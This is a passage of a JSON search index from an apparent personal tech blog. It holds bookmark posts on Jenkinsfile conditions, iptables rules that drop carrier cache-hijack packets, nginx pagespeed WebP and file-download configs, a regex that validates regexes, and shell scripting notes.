stage(\u0026#39;WHEN EXPRESSION with OR\u0026#39;) {\n         when {\n            expression {\n               VALUE_ONE == \u0026#39;1\u0026#39; || VALUE_THREE == \u0026#39;2\u0026#39;\n            }\n         }\n         steps {\n            echo \u0026#39;WHEN with OR expression works!\u0026#39;\n         }\n      }\n\n      // When - AllOf Example\n      stage(\u0026#34;AllOf\u0026#34;) {\n        when {\n            allOf {\n                environment name:\u0026#39;VALUE_ONE\u0026#39;, value: \u0026#39;1\u0026#39;\n                environment name:\u0026#39;VALUE_TWO\u0026#39;, value: \u0026#39;2\u0026#39;\n            }\n        }\n        steps {\n            echo \u0026#34;AllOf Works!!\u0026#34;\n        }\n      }\n\n      // When - Not AnyOf Example\n      stage(\u0026#34;Not AnyOf\u0026#34;) {\n         when {\n            not {\n               anyOf {\n                  branch \u0026#34;development\u0026#34;\n                  environment name:\u0026#39;VALUE_TWO\u0026#39;, value: \u0026#39;4\u0026#39;\n               }\n            }\n         }\n         steps {\n            echo \u0026#34;Not AnyOf - Works!\u0026#34;\n         }\n      }\n   }\n}\n\u003c/code\u003e\u003c/pre\u003e","tags":["URL","Jenkins"],"title":"Some Jenkinsfile examples"},{"categories":["URL","Ansible"],"contents":" Jinja docx template, avoiding new line in nested for ","date":"October 29, 2019","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191029-jinja-docx-template-avoiding-new-line-in-nested-for/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://stackoverflow.com/questions/45719062/jinja-docx-template-avoiding-new-line-in-nested-for#_=_\" target=\"_blank\" rel=\"noopener\"\u003eJinja docx template, avoiding new line in nested for\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Ansible"],"title":"Jinja docx template, avoiding new line in nested for"},{"categories":["URL","Python"],"contents":" What the f*ck Python! 🐍 ","date":"October 11, 2019","hero":"/images/hero/python.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191011-wtfpython-cn/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/leisurelicht/wtfpython-cn\" target=\"_blank\" rel=\"noopener\"\u003eWhat the f*ck Python! 🐍\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Python"],"title":"What the f*ck Python! 🐍"},{"categories":["URL","Network","Linux","Iptables"],"contents":" 再战运营商缓存之 使用 iptables 对付死 X 缓存劫持 起因 与移动的缓存问题进行斗争要追溯到两年前，那时候因为移动竟然连 cnpm 的数据都进行缓存。并且令人喷饭的是：移动的缓存服务器不但经常速度慢到堪比万年王八跑马拉松，甚至还经常宕机，导致我只想安安静静的写个代码却不得不面对一片鲜红的报错\n解决 iptables -I FORWARD -p tcp -m tcp -m ttl --ttl-gt 20 -m ttl --ttl-lt 30 -j DROP\n考虑到可能还真的有其他幺蛾子服务器发来的真实数据包的 TTL 也在 20-30 的区间范围内，应该再加一层判断。对比了移动的 302 劫持包和正常的 302 跳转包的报文后，发现移动的劫持包的状态位包含 FIN, PSH, ACK 而正常的 302 跳转包一般不会这三个都有\n那么就在 iptables 规则里加上状态位是否包含 FIN, PSH, ACK 的判断：\niptables -I FORWARD -p tcp -m tcp -m ttl --ttl-gt 20 -m ttl --ttl-lt 30 --tcp-flags ALL FIN,PSH,ACK -j DROP\n这样应该就能在丢弃移动劫持包的同时尽可能减少误伤正常数据包的可能。\n","date":"October 7, 2019","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191007-fuck-cmcc/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://v2c.tech/Article/FUCK-CMCC\" target=\"_blank\" rel=\"noopener\"\u003e再战运营商缓存之 使用 iptables 对付死 X 缓存劫持\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"起因\"\u003e起因\u003c/h5\u003e\n\u003cp\u003e与移动的缓存问题进行斗争要追溯到两年前，那时候因为移动竟然连 cnpm 的数据都进行缓存。并且令人喷饭的是：移动的缓存服务器不但经常速度慢到堪比万年王八跑马拉松，甚至还经常宕机，导致我只想安安静静的写个代码却不得不面对一片鲜红的报错\u003c/p\u003e\n\u003ch5 id=\"解决\"\u003e解决\u003c/h5\u003e\n\u003cp\u003e\u003ccode\u003eiptables -I FORWARD -p tcp -m tcp -m ttl --ttl-gt 20 -m ttl --ttl-lt 30 -j DROP\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e考虑到可能还真的有其他幺蛾子服务器发来的真实数据包的 TTL 也在 20-30 的区间范围内，应该再加一层判断。对比了移动的 302 劫持包和正常的 302 跳转包的报文后，发现移动的劫持包的状态位包含 FIN, PSH, ACK 而正常的 302 跳转包一般不会这三个都有\u003c/p\u003e\n\u003cp\u003e那么就在 iptables 规则里加上状态位是否包含 FIN, PSH, ACK 的判断：\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eiptables -I FORWARD -p tcp -m tcp -m ttl --ttl-gt 20 -m ttl --ttl-lt 30 --tcp-flags ALL FIN,PSH,ACK -j DROP\u003c/code\u003e\u003c/p\u003e","tags":["URL","Network","Linux","Iptables"],"title":"再战运营商缓存之 使用 iptables 对付死 X 缓存劫持"},{"categories":["URL","Nginx","Webp"],"contents":" 使用 Nginx 和 mod_pagespeed 自动将图片转换为 WebP 并输出 编译 ngx_pagespeed 首先确保 Nginx 有 --with-compat 编译参数，这样我们就不需要按照一些奇怪的教程让大家从头开始编译 Nginx\nincubator: https://github.com/apache/incubator-pagespeed-ngx.git\n# 切换到 nginx 源代码目录下开始配置编译环境 ./configure --with-compat --add-dynamic-module=../incubator-pagespeed-ngx # 编译 modules make modules # 将对应编译好的 module 放到 nginx 目录下： sudo cp objs/ngx_pagespeed.so /etc/nginx/modules/ # 创建好缓存文件夹以便存放自动转换的图片 sudo mkdir -p /var/ngx_pagespeed_cache sudo chown -R www-data:www-data /var/ngx_pagespeed_cache load_module modules/ngx_pagespeed.so; # enable pagespeed module on this server block pagespeed on; # Needs to exist and be writable by nginx. Use tmpfs for best performance. pagespeed FileCachePath /var/ngx_pagespeed_cache; # Ensure requests for pagespeed optimized resources go to the pagespeed handler # and no extraneous headers get set. location ~ \u0026#34;\\.pagespeed\\.([a-z]\\.)?[a-z]{2}\\.[^.]{10}\\.[^.]+\u0026#34; { add_header \u0026#34;\u0026#34; \u0026#34;\u0026#34;; } location ~ \u0026#34;^/pagespeed_static/\u0026#34; { } location ~ \u0026#34;^/ngx_pagespeed_beacon$\u0026#34; { } pagespeed RewriteLevel CoreFilters; 其中最后一个部分（pagespeed RewriteLevel CoreFilters;）表示启用的优化方式，其中包括了一些基础的优化，比如\nadd_head combine_css combine_javascript convert_meta_tags extend_cache fallback_rewrite_css_urls flatten_css_imports inline_css inline_import_to_link inline_javascript rewrite_css rewrite_images rewrite_javascript rewrite_style_attributes_with_url 如果需要加入别的 Filter ，可以类似这样写：\npagespeed EnableFilters combine_css,extend_cache,rewrite_images;\n所有的 Filters 列表可以参考：Configuring PageSpeed Filters，对于我们图片的转换的话，由于 PageSpeed 会自动判断是否需要转换，对于我们需要彻底转换 WebP 的需求，还需要加上几个 filter：\npagespeed EnableFilters convert_png_to_jpeg,convert_jpeg_to_webp;\n一些小问题 如果发现你的图片并没有自动被转换成 WebP 格式的话，可以在你的 URL 后面加上 ?PageSpeedFilters=+debug，然后查看源代码，并注意源代码中图片后面的部分，在我配置的过程中遇到过以下问题：\n1 \u0026lt;!--4xx status code, preventing rewriting of xxx 由于手上 Wordpress 的机器都是放在 Docker 中，前置了 Cloudflare，所以默认的回源方式会出错，这个时候需要这样配置一下，其中 localhost:2404 是本地 Docker 监听地址：\npagespeed MapOriginDomain \u0026#34;http://localhost:2404/\u0026#34; \u0026#34;https://nova.moe/\u0026#34;; 2 \u0026lt;!--deadline_exceeded for filter CacheExtender--\u0026gt;\u0026lt;!--deadline_exceeded for filter ImageRewrite--\u0026gt;\n这个表示 PageSpeed 正在生成对应的缓存图片\n3 \u0026lt;!--The preceding resource was not rewritten because its domain (nova.moe) is not authorized--\u0026gt;\n由于有反向代理，SSL 在 Nginx 上就已经结束，需要配置一下代理中的：\nproxy_set_header X-Forwarded-Proto $scheme; 并加上：\npagespeed RespectXForwardedProto on; ","date":"October 7, 2019","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191007-serve-webp-on-the-fly-with-nginx-and-mod_pagespeed/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://nova.moe/serve-webp-on-the-fly-with-nginx-and-mod_pagespeed/\" target=\"_blank\" rel=\"noopener\"\u003e使用 Nginx 和 mod_pagespeed 自动将图片转换为 WebP 并输出\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"编译-ngx_pagespeed\"\u003e编译 ngx_pagespeed\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e首先确保 Nginx 有 \u003ccode\u003e--with-compat\u003c/code\u003e 编译参数，这样我们就不需要按照一些奇怪的教程让大家从头开始编译 Nginx\u003c/p\u003e\n\u003cp\u003eincubator: \u003ca href=\"https://github.com/apache/incubator-pagespeed-ngx.git\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/apache/incubator-pagespeed-ngx.git\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 切换到 nginx 源代码目录下开始配置编译环境\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./configure --with-compat --add-dynamic-module\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e../incubator-pagespeed-ngx\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 编译 modules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emake modules\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 将对应编译好的 module 放到 nginx 目录下：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo cp objs/ngx_pagespeed.so /etc/nginx/modules/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 创建好缓存文件夹以便存放自动转换的图片\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo mkdir -p /var/ngx_pagespeed_cache\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo chown -R www-data:www-data /var/ngx_pagespeed_cache\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eload_module\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emodules/ngx_pagespeed.so\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# enable pagespeed module on this server block\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003epagespeed\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Needs to exist and be writable by nginx. Use tmpfs for best performance.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003epagespeed\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eFileCachePath\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/ngx_pagespeed_cache\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Ensure requests for pagespeed optimized resources go to the pagespeed handler\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# and no extraneous headers get set.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e ~ \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\\.pagespeed\\.([a-z]\\.)?[a-z]\u003c/span\u003e{\u003cspan style=\"color:#f92672\"\u003e2}\\.[^.]{10}\\.[^.]+\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e ~ \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;^/pagespeed_static/\u0026#34;\u003c/span\u003e { }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e ~ \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;^/ngx_pagespeed_beacon$\u0026#34;\u003c/span\u003e { }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epagespeed\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eRewriteLevel\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eCoreFilters\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e其中最后一个部分（\u003ccode\u003epagespeed RewriteLevel CoreFilters;\u003c/code\u003e）表示启用的优化方式，其中包括了一些基础的优化，比如\u003c/p\u003e","tags":["URL","Nginx","Webp"],"title":"使用 Nginx 和 mod_pagespeed 自动将图片转换为 WebP 并输出"},{"categories":["URL","Regex"],"contents":" Is there a regular expression to detect a valid regular expression? This is a recursive regex, and is not supported by many regex engines. PCRE based ones should support it.\n/ ^ # start of string ( # first group start (?: (?:[^?+*{}()[\\]\\\\|]+ # literals and ^, $ | \\\\. # escaped characters | \\[ (?: \\^?\\\\. | \\^[^\\\\] | [^\\\\^] ) # character classes (?: [^\\]\\\\]+ | \\\\. )* \\] | \\( (?:\\?[:=!]|\\?\u0026lt;[=!]|\\?\u0026gt;)? (?1)?? \\) # parenthesis, with recursive content | \\(\\? (?:R|[+-]?\\d+) \\) # recursive matching ) (?: (?:[?+*]|\\{\\d+(?:,\\d*)?\\}) [?+]? )? # quantifiers | \\| # alternative )* # repeat content ) # end first group $ # end of string / Without whitespace and comments\n/^((?:(?:[^?+*{}()[\\]\\\\|]+|\\\\.|\\[(?:\\^?\\\\.|\\^[^\\\\]|[^\\\\^])(?:[^\\]\\\\]+|\\\\.)*\\]|\\((?:\\?[:=!]|\\?\u0026lt;[=!]|\\?\u0026gt;)?(?1)??\\)|\\(\\?(?:R|[+-]?\\d+)\\))(?:(?:[?+*]|\\{\\d+(?:,\\d*)?\\})[?+]?)?|\\|)*)$/\n.NET does not support recursion directly. (The (?1) and (?R) constructs.) The recursion would have to be converted to counting balanced groups\n^ # start of string (?: (?: [^?+*{}()[\\]\\\\|]+ # literals and ^, $ | \\\\. # escaped characters | \\[ (?: \\^?\\\\. | \\^[^\\\\] | [^\\\\^] ) # character classes (?: [^\\]\\\\]+ | \\\\. )* \\] | \\( (?:\\?[:=!] | \\?\u0026lt;[=!] | \\?\u0026gt; | \\?\u0026lt;[^\\W\\d]\\w*\u0026gt; | \\?\u0026#39;[^\\W\\d]\\w*\u0026#39; )? # opening of group (?\u0026lt;N\u0026gt;) # increment counter | \\) # closing of group (?\u0026lt;-N\u0026gt;) # decrement counter ) (?: (?:[?+*]|\\{\\d+(?:,\\d*)?\\}) [?+]? )? # quantifiers | \\| # alternative )* # repeat content $ # end of string (?(N)(?!)) # fail if counter is non-zero. Compacted\n^(?:(?:[^?+*{}()[\\]\\\\|]+|\\\\.|\\[(?:\\^?\\\\.|\\^[^\\\\]|[^\\\\^])(?:[^\\]\\\\]+|\\\\.)*\\]|\\((?:\\?[:=!]|\\?\u0026lt;[=!]|\\?\u0026gt;|\\?\u0026lt;[^\\W\\d]\\w*\u0026gt;|\\?'[^\\W\\d]\\w*')?(?\u0026lt;N\u0026gt;)|\\)(?\u0026lt;-N\u0026gt;))(?:(?:[?+*]|\\{\\d+(?:,\\d*)?\\})[?+]?)?|\\|)*$(?(N)(?!))\n","date":"October 4, 2019","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191004-is-there-a-regular-expression-to-detect-a-valid-regular-expression/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://stackoverflow.com/questions/172303/is-there-a-regular-expression-to-detect-a-valid-regular-expression\" target=\"_blank\" rel=\"noopener\"\u003eIs there a regular expression to detect a valid regular expression?\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThis is a recursive regex, and is not supported by many regex engines. PCRE based ones should support it.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e/\n^                                             # start of string\n(                                             # first group start\n  (?:\n    (?:[^?+*{}()[\\]\\\\|]+                      # literals and ^, $\n     | \\\\.                                    # escaped characters\n     | \\[ (?: \\^?\\\\. | \\^[^\\\\] | [^\\\\^] )     # character classes\n          (?: [^\\]\\\\]+ | \\\\. )* \\]\n     | \\( (?:\\?[:=!]|\\?\u0026lt;[=!]|\\?\u0026gt;)? (?1)?? \\)  # parenthesis, with recursive content\n     | \\(\\? (?:R|[+-]?\\d+) \\)                 # recursive matching\n     )\n    (?: (?:[?+*]|\\{\\d+(?:,\\d*)?\\}) [?+]? )?   # quantifiers\n  | \\|                                        # alternative\n  )*                                          # repeat content\n)                                             # end first group\n$                                             # end of string\n/\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eWithout whitespace and comments\u003c/p\u003e","tags":["URL","Regex"],"title":"Is there a regular expression to detect a valid regular expression?"},{"categories":["URL","Nginx"],"contents":" Force file download with Nginx add_header Content-Disposition 'attachment;';\nserver { listen 80; server_name my.domain.com; location ~ ^.*/(?P\u0026lt;request_basename\u0026gt;[^/]+\\.(mp3))$ { root /path/to/mp3/ add_header Content-Disposition \u0026#39;attachment; filename=\u0026#34;$request_basename\u0026#34;\u0026#39;; } } { listen 80; server_name backup.baifu-tech.net; root /data/backup/rechargecent-mago; location / { auth_basic \u0026#34;baifu backup center\u0026#34;; auth_basic_user_file /etc/nginx/ssl/htpasswd; autoindex on; autoindex_exact_size off; autoindex_localtime on; } } ","date":"August 19, 2019","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20190819-force-file-download-with-nginx/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://coderwall.com/p/3yb8vg/force-file-download-with-nginx\" target=\"_blank\" rel=\"noopener\"\u003eForce file download with Nginx\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ccode\u003eadd_header Content-Disposition 'attachment;';\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emy.domain.com\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e ~ \u003cspan style=\"color:#e6db74\"\u003e^.*/(?P\u0026lt;request_basename\u0026gt;[^/]+\\.(mp3))$\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/path/to/mp3/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eContent-Disposition\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;attachment\u003c/span\u003e; \u003cspan style=\"color:#f92672\"\u003efilename=\u0026#34;$request_basename\u0026#34;\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eserver_name\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003ebackup.baifu-tech.net\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/data/backup/rechargecent-mago\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eauth_basic\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;baifu\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ebackup\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ecenter\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eauth_basic_user_file\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/nginx/ssl/htpasswd\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eautoindex\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eautoindex_exact_size\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eautoindex_localtime\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Nginx"],"title":"Force file download with Nginx"},{"categories":["URL","SHELL"],"contents":" Shell 脚本学习笔记 执行算术运算 val=`expr $a + $b` 运算符 符号 说明 示例 ! 非运算 [ ! false ] -o 或运算 [ $a -lt 20 -o $b -gt 20 ] -a 与运算 [ $a -lt 20 -a $b -gt 20 ] = 相等检测 [ $a = $b ] != 不相等检测 [ $a != $b ] -z 字符串长度是否为 0，为 0 则返回 true [ -z $a ] -n 字符串长度不为 0， 不为 0 返回 true [ -n $a ] str 检测字符串是否为空，不为空返回 true [ $a ] -b 检测文件是否是块设备文件 [ -b $file ] -c 检测文件是否是字符设备 .. -d 检测文件是否为目录 [ -d $file ] -f 检测文件是否为普通文件 [ -f $file ] -r 检测文件是否可读 .. -w 检测文件是否可写 .. -x 检测文件是否可执行 .. -s 检测文件是否为空 .. -e 检测文件是否存在 .. 特殊变量 变量 含义 $0 当前脚本的文件名 $n 传递给脚本或函数的参数。n 是一个数字，表示第几个参数 $# 传递给脚本或函数的参数个数 $* 传递给脚本或函数的所有参数，所有参数被当做一个词，例如 \u0026ldquo;1 2 3\u0026rdquo; $@ 传递给脚本或函数的所有参数，每个参数当做一个词，用双引号包含，例如\u0026quot;1\u0026quot; \u0026ldquo;2\u0026rdquo; \u0026ldquo;3\u0026rdquo; $? 上个命令的退出状态，或函数的返回值 $$ 当前 Shell 进程 ID。对于 Shell 脚本，就是这些脚本所在的进程 ID POSIX 程序退出状态 状态码 含义 0 命令成功退出 \u0026gt; 0 在重定向或者单词展开期间(~、变量、命令、算术展开以及单词切割)失败 1 - 125 命令不成功退出。特定的退出值的含义，有各个命令自行定义 126 命令找到了，但是文件无法执行 127 命令没有找到 \u0026gt; 128 命令因收到信号而死亡 输入输出重定向 命令 说明 command \u0026gt; file 将输出重定向到 file。 command \u0026gt; file 将输出以追加的方式重定向到 file。 n \u0026gt; file 将文件描述符为 n 的文件重定向到 file。 n \u0026raquo; file 将文件描述符为 n 的文件以追加的方式重定向到 file。 n \u0026gt;\u0026amp; m 将输出文件 m 和 n 合并。 n \u0026lt;\u0026amp; m 将输入文件 m 和 n 合并。 \u0026laquo; tag 将开始标记 tag 和结束标记 tag 之间的内容作为输入。 文件包含 使用.或者source包含文件\n. filename source filename 被包含文件不需要有执行权限\n使用函数 下面是函数基本结构\n# 